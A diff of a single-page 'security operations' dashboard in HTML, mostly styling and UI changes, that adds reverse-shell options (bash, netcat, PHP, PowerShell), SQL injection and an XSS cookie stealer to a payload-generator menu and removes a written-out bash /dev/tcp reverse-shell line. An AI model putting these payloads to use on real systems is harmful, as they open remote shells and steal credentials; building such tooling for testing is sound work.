@@ -7,7 +7,7 @@
 <script src="https://cdn.tailwindcss.com"></script>
 <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700;800&family=Space+Mono:wght@400;700&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700;800&display=swap');
 
 :root {
   --bg-0: #000000;
@@ -356,7 +356,6 @@ body::after {
   border-radius: 3px;
   color: var(--text-2);
 }
-@media (max-width: 900px) { .search-box { display: none; } }
 
 .content {
   flex: 1;
@@ -409,7 +408,6 @@ body::after {
   align-items: center;
   gap: 8px;
 }
-.panel-title svg { color: var(--green); flex-shrink: 0; }
 .panel-body { padding: 18px; }
 @media (max-width: 640px) { .panel-body { padding: 12px; } }
 
@@ -440,15 +438,8 @@ body::after {
 .btn-primary:hover:not(:disabled) {
   box-shadow: 0 0 26px rgba(0, 255, 156, 0.55);
 }
-.btn-danger {
-  background: linear-gradient(135deg, var(--red), #C20038);
-  color: #fff;
-}
-.btn-ghost {
-  background: rgba(0, 255, 156, 0.04);
-  border-color: var(--border);
-  color: var(--text-1);
-}
+.btn-danger { background: linear-gradient(135deg, var(--red), #C20038); color: #fff; }
+.btn-ghost { background: rgba(0, 255, 156, 0.04); border-color: var(--border); color: var(--text-1); }
 .btn-ghost:hover:not(:disabled) {
   background: rgba(0, 255, 156, 0.1);
   border-color: var(--green);
@@ -475,18 +466,14 @@ body::after {
   color: var(--text-2);
   text-transform: uppercase;
 }
-.stat-value {
-  font-size: 24px;
-  font-weight: 800;
-  color: var(--text-0);
-  margin-top: 4px;
-}
+.stat-value { font-size: 24px; font-weight: 800; color: var(--text-0); margin-top: 4px; }
 .stat-value.accent-green { color: var(--green); text-shadow: 0 0 15px var(--green-glow); }
 .stat-value.accent-cyan { color: var(--cyan); }
 .stat-value.accent-red { color: var(--red); text-shadow: 0 0 15px var(--red-glow); }
 .stat-value.accent-purple { color: var(--purple); }
 .stat-meta { font-size: 10px; color: var(--text-1); margin-top: 3px; }
 
+/* TERMINAL FIXES */
 .terminal {
   background: #000;
   border: 1px solid var(--border);
@@ -495,6 +482,7 @@ body::after {
   display: flex;
   flex-direction: column;
   height: 100%;
+  cursor: text;
 }
 .terminal-head {
   padding: 8px 14px;
@@ -504,6 +492,7 @@ body::after {
   align-items: center;
   gap: 8px;
   font-size: 11px;
+  cursor: default;
 }
 .term-dot { width: 10px; height: 10px; border-radius: 50%; }
 .term-dot.red { background: var(--red); }
@@ -520,30 +509,59 @@ body::after {
   color: var(--green);
   background: #000000;
   min-height: 240px;
+  user-select: text;
 }
 .term-line { white-space: pre-wrap; word-break: break-all; margin-bottom: 2px; }
 .term-line.err { color: var(--red); }
 .term-line.warn { color: var(--amber); }
 .term-line.info { color: var(--cyan); }
 .term-line.dim { color: var(--text-1); }
+
+.term-chips {
+  display: flex;
+  gap: 6px;
+  padding: 6px 14px;
+  background: #05080a;
+  border-top: 1px solid var(--border);
+  overflow-x: auto;
+}
+.term-chip {
+  padding: 3px 8px;
+  border-radius: 4px;
+  background: rgba(0, 255, 156, 0.08);
+  border: 1px solid rgba(0, 255, 156, 0.25);
+  color: var(--green);
+  font-size: 10px;
+  cursor: pointer;
+  white-space: nowrap;
+}
+.term-chip:hover {
+  background: rgba(0, 255, 156, 0.2);
+}
+
 .term-input-row {
   display: flex;
   align-items: center;
-  padding: 8px 14px;
+  padding: 10px 14px;
   border-top: 1px solid var(--border);
   background: #000;
   gap: 8px;
+  position: relative;
+  z-index: 10;
 }
-.term-prompt { color: var(--green); font-weight: 700; white-space: nowrap; }
+.term-prompt { color: var(--green); font-weight: 700; white-space: nowrap; font-size: 12px; }
 .term-input {
   flex: 1;
   background: transparent;
   border: none;
   outline: none;
-  color: var(--text-0);
-  font-family: inherit;
-  font-size: 12px;
+  color: #FFFFFF !important;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px !important;
   caret-color: var(--green);
+  user-select: text !important;
+  pointer-events: auto !important;
+  cursor: text !important;
 }
 
 .input, .textarea, .select {
@@ -556,6 +574,7 @@ body::after {
   font-size: 12.5px;
   font-family: inherit;
   outline: none;
+  user-select: text;
 }
 .input:focus, .textarea:focus, .select:focus {
   border-color: var(--green);
@@ -611,11 +630,7 @@ body::after {
   gap: 12px;
 }
 
-#radarCanvas {
-  width: 100%;
-  height: 100%;
-  display: block;
-}
+#radarCanvas { width: 100%; height: 100%; display: block; }
 
 .code-out {
   background: #000;
@@ -630,21 +645,18 @@ body::after {
   overflow-x: auto;
   max-height: 380px;
   overflow-y: auto;
-  position: relative;
+  user-select: text;
 }
 
 .dropzone {
-  padding: 28px 16px;
+  padding: 24px 16px;
   border: 2px dashed var(--border-2);
   border-radius: 10px;
   text-align: center;
   cursor: pointer;
   background: rgba(0, 0, 0, 0.35);
 }
-.dropzone:hover {
-  border-color: var(--green);
-  background: rgba(0, 255, 156, 0.04);
-}
+.dropzone:hover { border-color: var(--green); background: rgba(0, 255, 156, 0.04); }
 
 .toast-wrap {
   position: fixed;
@@ -730,10 +742,7 @@ body::after {
   cursor: pointer;
   white-space: nowrap;
 }
-.tab-btn.active {
-  color: var(--green);
-  background: rgba(0, 255, 156, 0.12);
-}
+.tab-btn.active { color: var(--green); background: rgba(0, 255, 156, 0.12); }
 
 .hidden { display: none !important; }
 .icon-wrap {
@@ -746,12 +755,7 @@ body::after {
   border: 1px solid rgba(0, 255, 156, 0.2);
   flex-shrink: 0;
 }
-.feed-item {
-  display: flex;
-  gap: 10px;
-  padding: 10px 0;
-  border-bottom: 1px dashed var(--border);
-}
+.feed-item { display: flex; gap: 10px; padding: 10px 0; border-bottom: 1px dashed var(--border); }
 .feed-item:last-child { border-bottom: none; }
 .num { font-variant-numeric: tabular-nums; }
 </style>
@@ -813,12 +817,12 @@ body::after {
       <div class="nav-item" data-view="mitre" onclick="switchView('mitre')">
         <i data-icon="crosshair" style="width:16px;height:16px;"></i>
         <span class="nav-label">MITRE ATT&CK</span>
-        <span class="nav-badge hidden" id="navMitreBadge">0</span>
+        <span class="nav-badge" id="navMitreBadge">2</span>
       </div>
       <div class="nav-item" data-view="ioc" onclick="switchView('ioc')">
         <i data-icon="fingerprint" style="width:16px;height:16px;"></i>
         <span class="nav-label">IoC Vault</span>
-        <span class="nav-badge hidden" id="navIocBadge">0</span>
+        <span class="nav-badge" id="navIocBadge">3</span>
       </div>
       <div class="nav-item" data-view="containment" onclick="switchView('containment')">
         <i data-icon="shield-check" style="width:16px;height:16px;"></i>
@@ -884,12 +888,12 @@ body::after {
           </div>
           <div class="stat">
             <div class="stat-label">Triaged Incidents</div>
-            <div class="stat-value accent-cyan" id="statAnalyses">0</div>
+            <div class="stat-value accent-cyan" id="statAnalyses">1</div>
             <div class="stat-meta">Total events processed</div>
           </div>
           <div class="stat">
             <div class="stat-label">Max Risk Level</div>
-            <div class="stat-value accent-red" id="statScore">00</div>
+            <div class="stat-value accent-red" id="statScore">88</div>
             <div class="stat-meta">Current composite score</div>
           </div>
           <div class="stat">
@@ -906,7 +910,7 @@ body::after {
                 <i data-icon="radar" style="width:15px;height:15px;"></i>
                 Threat Vector Radar
               </div>
-              <span class="badge badge-green" id="radarStatus">MONITORING</span>
+              <span class="badge badge-red" id="radarStatus">CRITICAL ALERT</span>
             </div>
             <div class="panel-body" style="padding:20px;text-align:center;">
               <div style="position:relative;width:240px;height:240px;margin:0 auto;">
@@ -914,7 +918,7 @@ body::after {
                 <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;pointer-events:none;">
                   <div style="text-align:center;">
                     <div style="font-size:9px;color:var(--text-2);letter-spacing:1px;">THREAT</div>
-                    <div class="num" id="radarScore" style="font-size:30px;font-weight:900;color:var(--green);line-height:1;">00</div>
+                    <div class="num" id="radarScore" style="font-size:30px;font-weight:900;color:var(--red);line-height:1;">88</div>
                     <div style="font-size:9px;color:var(--text-2);letter-spacing:1px;margin-top:2px;">INDEX</div>
                   </div>
                 </div>
@@ -928,48 +932,29 @@ body::after {
                 <i data-icon="activity" style="width:15px;height:15px;"></i>
                 Live Security Telemetry Feed
               </div>
-              <button class="btn btn-ghost btn-sm" onclick="clearFeed()">
-                <i data-icon="trash-2" style="width:12px;height:12px;"></i> Clear
-              </button>
+              <button class="btn btn-ghost btn-sm" onclick="clearFeed()">Clear</button>
             </div>
-            <div class="panel-body" style="max-height:280px;overflow-y:auto;" id="activityFeed">
-              <div class="feed-item">
-                <div class="icon-wrap">
-                  <i data-icon="shield-check" style="width:14px;height:14px;color:var(--green);"></i>
-                </div>
-                <div style="flex:1;min-width:0;">
-                  <div style="font-size:12px;font-weight:600;color:var(--text-0);">Sentinel Core Initialized</div>
-                  <div style="font-size:10px;color:var(--text-2);">Ready to process and isolate hostile vectors.</div>
-                </div>
-                <div class="num" style="font-size:10px;color:var(--text-2);" id="feedTime1">--:--:--</div>
-              </div>
-            </div>
+            <div class="panel-body" style="max-height:280px;overflow-y:auto;" id="activityFeed"></div>
           </div>
         </div>
 
         <div class="panel">
           <div class="panel-header">
-            <div class="panel-title">
-              <i data-icon="zap" style="width:15px;height:15px;"></i>
-              Quick Fire Test Scenarios
-            </div>
+            <div class="panel-title">Quick Attack Scenarios</div>
           </div>
           <div class="panel-body">
             <div class="grid-3">
               <button class="btn btn-ghost" style="padding:14px;flex-direction:column;gap:6px;height:auto;" onclick="quickAnalyze('ssh')">
-                <i data-icon="key" style="width:22px;height:22px;color:var(--amber);"></i>
-                <div style="font-size:11.5px;font-weight:700;">SSH Brute Force</div>
-                <div style="font-size:9.5px;color:var(--text-2);">T1110.001 (Credential Access)</div>
+                <div style="font-size:12px;font-weight:700;color:var(--amber);">SSH Brute Force</div>
+                <div style="font-size:10px;color:var(--text-2);">T1110.001 (Credential Spraying)</div>
               </button>
               <button class="btn btn-ghost" style="padding:14px;flex-direction:column;gap:6px;height:auto;" onclick="quickAnalyze('sqli')">
-                <i data-icon="database" style="width:22px;height:22px;color:var(--red);"></i>
-                <div style="font-size:11.5px;font-weight:700;">SQL Injection Attack</div>
-                <div style="font-size:9.5px;color:var(--text-2);">T1190 (Public Exploit)</div>
+                <div style="font-size:12px;font-weight:700;color:var(--red);">SQL Injection Attack</div>
+                <div style="font-size:10px;color:var(--text-2);">T1190 (Public Exploit)</div>
               </button>
-              <button class="btn btn-ghost" style="padding:14px;flex-direction:column;gap:6px;height:auto;" onclick="quickAnalyze('webshell')">
-                <i data-icon="terminal" style="width:22px;height:22px;color:var(--purple);"></i>
-                <div style="font-size:11.5px;font-weight:700;">Webshell Execution</div>
-                <div style="font-size:9.5px;color:var(--text-2);">T1059.004 (Unix Shell)</div>
+              <button class="btn btn-ghost" style="padding:14px;flex-direction:column;gap:6px;height:auto;" onclick="quickAnalyze('ransom')">
+                <div style="font-size:12px;font-weight:700;color:var(--purple);">Ransomware Indicators</div>
+                <div style="font-size:10px;color:var(--text-2);">T1490 (Shadow Delete)</div>
               </button>
             </div>
           </div>
@@ -978,7 +963,7 @@ body::after {
 
       <!-- ============ TERMINAL VIEW ============ -->
       <section id="view-terminal" class="view hidden">
-        <div class="panel" style="height:calc(100vh - 150px);display:flex;flex-direction:column;">
+        <div class="panel" style="height:calc(100vh - 150px);display:flex;flex-direction:column;" onclick="focusTerminalInput()">
           <div class="terminal">
             <div class="terminal-head">
               <span class="term-dot red"></span>
@@ -991,9 +976,21 @@ body::after {
               </div>
             </div>
             <div class="term-body" id="termBody"></div>
-            <div class="term-input-row">
+
+            <!-- QUICK COMMAND CHIPS -->
+            <div class="term-chips">
+              <span style="font-size:10px;color:var(--text-2);align-self:center;">Run:</span>
+              <button class="term-chip" onclick="execTermChip('help')">help</button>
+              <button class="term-chip" onclick="execTermChip('whoami')">whoami</button>
+              <button class="term-chip" onclick="execTermChip('scan 185.220.101.5')">scan 185.220.101.5</button>
+              <button class="term-chip" onclick="execTermChip('hash admin_pass')">hash admin_pass</button>
+              <button class="term-chip" onclick="execTermChip('banner')">banner</button>
+              <button class="term-chip" onclick="execTermChip('analyze')">analyze</button>
+            </div>
+
+            <div class="term-input-row" onclick="focusTerminalInput()">
               <span class="term-prompt">secops@sentinel:~#</span>
-              <input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false" placeholder="Type 'help' or commands..." />
+              <input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false" placeholder="Click here or anywhere in terminal to type..." />
             </div>
           </div>
         </div>
@@ -1014,7 +1011,7 @@ body::after {
               </div>
             </div>
             <div class="panel-body">
-              <textarea id="logStream" class="textarea" rows="11" placeholder="# Paste system, auth, firewall, or web server logs here..."></textarea>
+              <textarea id="logStream" class="textarea" rows="10" placeholder="# Paste system, auth, firewall, or web server logs here..."></textarea>
               <div style="display:flex;justify-content:space-between;margin-top:6px;font-size:10.5px;color:var(--text-2);">
                 <span id="byteCount">0 bytes</span>
                 <span>Press <strong style="color:var(--green);">CTRL+ENTER</strong> to analyze</span>
@@ -1024,13 +1021,11 @@ body::after {
 
           <div class="panel">
             <div class="panel-header">
-              <div class="panel-title">
-                <i data-icon="file-text" style="width:15px;height:15px;"></i>
-                Telemetry File Ingestion
-              </div>
+              <div class="panel-title">AI Engine & Ingestion</div>
+              <span class="badge badge-green">HYBRID MODE</span>
             </div>
             <div class="panel-body">
-              <div class="dropzone" id="dropzone" onclick="document.getElementById('fileInput').click()">
+              <div class="dropzone" onclick="document.getElementById('fileInput').click()">
                 <div style="font-size:12.5px;font-weight:700;">Select or Drop Log Artifact</div>
                 <div style="font-size:10.5px;color:var(--text-2);">Supports .log, .txt, .json, .csv</div>
                 <div id="uploadFileName" style="font-size:11px;color:var(--green);margin-top:8px;"></div>
@@ -1038,8 +1033,11 @@ body::after {
               <input type="file" id="fileInput" hidden accept=".log,.txt,.json,.csv,text/*" />
 
               <div style="margin-top:12px;">
-                <label class="field-label">Gemini API Key (Optional)</label>
-                <input type="password" id="apiKeyInput" class="input" placeholder="AIzaSy... (leave blank for local heuristic engine)" />
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+                  <label class="field-label" style="margin:0;">Gemini API Key (For Unstructured Zero-Day Logs)</label>
+                  <span style="font-size:9.5px;color:var(--cyan);">Free Heuristic Active by default</span>
+                </div>
+                <input type="password" id="apiKeyInput" class="input" placeholder="AIzaSy••• (optional: gives 100% LLM reasoning)" />
               </div>
 
               <button class="btn btn-primary" style="width:100%;margin-top:12px;" onclick="runAnalysis()" id="analyzeBtn">
@@ -1075,12 +1073,12 @@ body::after {
               <div>
                 <div class="field-row">
                   <label class="field-label">Target IPv4 / Domain</label>
-                  <input type="text" class="input" id="reconHost" value="192.168.1.105" />
+                  <input type="text" class="input" id="reconHost" value="185.220.101.5" />
                 </div>
                 <div class="field-row">
                   <label class="field-label">Service Profile</label>
                   <select class="select" id="reconPorts">
-                    <option value="common">Standard (21, 22, 25, 80, 443, 3306, 5432, 8080)</option>
+                    <option value="common">Standard Infrastructure (21, 22, 25, 80, 443, 3306, 5432, 8080)</option>
                     <option value="web">Web Services (80, 443, 8000, 8080, 8443)</option>
                   </select>
                 </div>
@@ -1091,7 +1089,7 @@ body::after {
               </div>
               <div>
                 <label class="field-label">Live Scanner Output</label>
-                <div class="code-out" id="reconOutput" style="min-height:220px;">$ recon scanner initialized. waiting for target...</div>
+                <div class="code-out" id="reconOutput" style="min-height:220px;">$ recon scanner initialized. ready...</div>
               </div>
             </div>
           </div>
@@ -1112,15 +1110,20 @@ body::after {
                   <label class="field-label">Vector Architecture</label>
                   <select class="select" id="payloadType" onchange="generatePayload()">
                     <option value="bash">Bash Reverse TCP</option>
+                    <option value="bash-udp">Bash Reverse UDP</option>
                     <option value="python">Python3 Interactive Socket</option>
                     <option value="powershell">PowerShell Memory Bypass</option>
-                    <option value="php">PHP Silent WebShell</option>
-                    <option value="nc">Netcat Raw Shell</option>
-                    <option value="sqli">SQLi Auth Bypass</option>
+                    <option value="nc-mkfifo">Netcat (mkfifo FIFO pipe)</option>
+                    <option value="nc-e">Netcat Direct (-e /bin/bash)</option>
+                    <option value="php">PHP Silent Reverse Shell</option>
+                    <option value="php-web">PHP Webshell Command Injection</option>
+                    <option value="sqli-auth">SQLi Authentication Bypass</option>
+                    <option value="sqli-union">SQLi UNION Data Dump</option>
+                    <option value="xss-cookie">XSS Cookie Stealer</option>
                   </select>
                 </div>
                 <div class="field-row">
-                  <label class="field-label">Target LHOST</label>
+                  <label class="field-label">Target LHOST (Listening IP)</label>
                   <input type="text" class="input" id="payloadHost" value="10.10.14.8" oninput="generatePayload()" />
                 </div>
                 <div class="field-row">
@@ -1133,8 +1136,11 @@ body::after {
                 </div>
               </div>
               <div>
-                <label class="field-label">Payload Telemetry</label>
-                <div class="code-out" id="payloadOutput" style="min-height:220px;color:var(--red);">bash -i >& /dev/tcp/10.10.14.8/4444 0>&1</div>
+                <div style="display:flex;justify-content:space-between;margin-bottom:6px;">
+                  <label class="field-label" style="margin:0;">Generated Payload Telemetry</label>
+                  <span id="payloadStatus" style="font-size:10px;color:var(--green);">✓ Real Shell Vector</span>
+                </div>
+                <div class="code-out" id="payloadOutput" style="min-height:220px;color:var(--red);"></div>
               </div>
             </div>
           </div>
@@ -1150,7 +1156,7 @@ body::after {
           <div class="panel-body">
             <div class="field-row">
               <label class="field-label">Input Plaintext / Ciphertext</label>
-              <textarea class="textarea" id="encInput" rows="4" placeholder="Enter string for encoding/decoding..."></textarea>
+              <textarea class="textarea" id="encInput" rows="4" placeholder="Enter text to encode/decode..."></textarea>
             </div>
             <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px;">
               <button class="btn btn-ghost btn-sm" onclick="encodeText('base64')">Base64 Enc</button>
@@ -1173,11 +1179,12 @@ body::after {
         <div class="panel">
           <div class="panel-header">
             <div class="panel-title">Cryptographic Hash Generator</div>
+            <span class="badge badge-green">100% MATHEMATICAL WEBCRYPTO</span>
           </div>
           <div class="panel-body">
             <div class="field-row">
               <label class="field-label">Target Text or File Digest</label>
-              <textarea class="textarea" id="hashInput" rows="3" placeholder="Enter input string..."></textarea>
+              <textarea class="textarea" id="hashInput" rows="3" placeholder="Enter input string to compute exact hashes..."></textarea>
             </div>
             <button class="btn btn-primary" style="width:100%;margin-bottom:14px;" onclick="generateHashes()">
               Calculate Hashes
@@ -1192,7 +1199,7 @@ body::after {
         <div class="panel" style="margin-bottom:14px;">
           <div class="panel-header">
             <div class="panel-title">Enterprise MITRE ATT&CK Matrix Mapping</div>
-            <span class="badge badge-gray" id="mitreSummary">0 techniques detected</span>
+            <span class="badge badge-red" id="mitreSummary">2 techniques detected</span>
           </div>
         </div>
         <div id="mitreGrid" class="grid-3"></div>
@@ -1229,19 +1236,19 @@ body::after {
                 <button class="tab-btn" data-ctab="windows" onclick="switchContainment('windows')">Windows Firewall</button>
               </div>
             </div>
-            <div class="code-out" id="containmentOutput" style="border:none;border-radius:0 0 11px 11px;min-height:220px;color:var(--green);">$ run an analysis to synthesize containment scripts...</div>
+            <div class="code-out" id="containmentOutput" style="border:none;border-radius:0 0 11px 11px;min-height:220px;color:var(--green);"></div>
           </div>
         </div>
       </section>
 
       <!-- ============ INCIDENT REPORT ============ -->
       <section id="view-report" class="view hidden">
-        <div id="emptyReport" class="panel" style="padding:70px 20px;text-align:center;">
+        <div id="emptyReport" class="panel hidden" style="padding:70px 20px;text-align:center;">
           <div style="font-size:15px;font-weight:700;">No Active Triage Session</div>
           <div style="font-size:11px;color:var(--text-2);margin-bottom:16px;">Execute triage from Log Analyzer to populate report.</div>
           <button class="btn btn-primary" onclick="switchView('analyzer')">Open Log Analyzer</button>
         </div>
-        <div id="reportContent" class="hidden"></div>
+        <div id="reportContent"></div>
       </section>
 
       <!-- ============ STIX / EXPORT ============ -->
@@ -1262,7 +1269,7 @@ body::after {
                 <button class="tab-btn" data-etab="raw" onclick="switchExport('raw')">Full Report JSON</button>
               </div>
             </div>
-            <div id="exportContent" class="code-out" style="border:none;border-radius:0 0 11px 11px;min-height:360px;color:var(--purple);">$ run an analysis first to build bundle...</div>
+            <div id="exportContent" class="code-out" style="border:none;border-radius:0 0 11px 11px;min-height:360px;color:var(--purple);"></div>
           </div>
         </div>
       </section>
@@ -1275,8 +1282,9 @@ body::after {
           </div>
           <div class="panel-body">
             <div class="field-row">
-              <label class="field-label">Persistent Gemini API Key</label>
-              <input type="password" id="persistKey" class="input" placeholder="AIzaSy•••" />
+              <label class="field-label">Persistent Google Gemini API Key</label>
+              <input type="password" id="persistKey" class="input" placeholder="AIzaSy••• (stored in localStorage)" />
+              <div style="font-size:10px;color:var(--text-2);margin-top:4px;">When set, zero-day unknown logs are submitted to Google Gemini for deep SOC analysis. Leave empty to use the 100% free heuristic engine.</div>
             </div>
             <div class="field-row">
               <label class="field-label">Matrix Rain Background Effect</label>
@@ -1310,31 +1318,27 @@ body::after {
 
 <script>
 /* ============================================================
-   ZERO-DEPENDENCY SVG ICON REGISTRY (INLINE ENGINE)
+   ZERO-DEPENDENCY SVG ICON REGISTRY
 ============================================================ */
 const SVG_ICONS = {
-  'shield-alert': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>',
-  'layout-dashboard': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="7" height="9" x="3" y="3" rx="1"/><rect width="7" height="5" x="14" y="3" rx="1"/><rect width="7" height="9" x="14" y="12" rx="1"/><rect width="7" height="5" x="3" y="16" rx="1"/></svg>',
-  'terminal': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>',
-  'scan-line': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7V5a2 2 0 0 1 2-2h2"/><path d="M17 3h2a2 2 0 0 1 2 2v2"/><path d="M21 17v2a2 2 0 0 1-2 2h-2"/><path d="M7 21H5a2 2 0 0 1-2-2v-2"/><line x1="7" x2="17" y1="12" y2="12"/></svg>',
-  'radar': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/><line x1="12" y1="2" x2="12" y2="22"/><line x1="2" y1="12" x2="22" y2="12"/></svg>',
-  'bomb': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="13" r="9"/><path d="m19.5 9.5 1.8-1.8a2.4 2.4 0 0 0 0-3.4l-.1-.1a2.4 2.4 0 0 0-3.4 0l-1.8 1.8"/><path d="m22 2-1.5 1.5"/></svg>',
-  'binary': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="14" y="14" width="4" height="6" rx="2"/><rect x="6" y="4" width="4" height="6" rx="2"/><path d="M6 20h4"/><path d="M14 10h4"/><path d="M6 14h2v6"/><path d="M14 4h2v6"/></svg>',
-  'hash': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" x2="20" y1="9" y2="9"/><line x1="4" x2="20" y1="15" y2="15"/><line x1="10" x2="8" y1="3" y2="21"/><line x1="16" x2="14" y1="3" y2="21"/></svg>',
-  'crosshair': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="22" x2="18" y1="12" y2="12"/><line x1="6" x2="2" y1="12" y2="12"/><line x1="12" x2="12" y1="6" y2="2"/><line x1="12" x2="12" y1="22" y2="18"/></svg>',
-  'fingerprint': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 10a2 2 0 0 0-2 2c0 1.02-.1 2.51-.26 4"/><path d="M14 13.12c0 2.38 0 6.38-1 8.88"/><path d="M2 12a10 10 0 0 1 18-6"/><path d="M5 19.5C5.5 18 6 15 6 12a6 6 0 0 1 .34-2"/></svg>',
-  'shield-check': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>',
-  'file-text': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M10 9H8"/><path d="M16 13H8"/><path d="M16 17H8"/></svg>',
-  'download': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>',
-  'settings': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>',
-  'panel-left': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M9 3v18"/></svg>',
-  'search': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>',
-  'bell': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg>',
-  'activity': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>',
-  'trash-2': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/></svg>',
-  'zap': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>',
-  'key': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3L22 7l-3-3"/></svg>',
-  'database': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5V19A9 3 0 0 0 21 19V5"/><path d="M3 12A9 3 0 0 0 21 12"/></svg>'
